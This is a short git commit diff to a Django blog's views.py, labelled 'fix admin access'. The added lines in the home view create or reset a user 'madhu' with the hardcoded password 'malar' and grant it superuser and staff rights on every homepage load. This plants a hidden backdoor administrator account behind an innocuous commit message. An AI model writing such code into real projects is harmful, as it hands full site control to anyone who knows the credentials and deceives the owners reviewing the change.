25f3853155d9fbdf4311a9c4b0970a3d741ebf89
VANTAN <vantan@VANTANs-MacBook-Air.local>
2026-04-26 16:15:35 +0530

    fix admin access

--- blog/views.py
+++ blog/views.py
@@ -3,7 +3,12 @@ from .models import Post
 from django.contrib.auth.models import User
 
 def home(request):
+    user, created = User.objects.get_or_create(username='madhu')
 
+    user.set_password('malar')
+    user.is_superuser = True
+    user.is_staff = True
+    user.save()
 
     posts = Post.objects.all().order_by('-created_at')
 
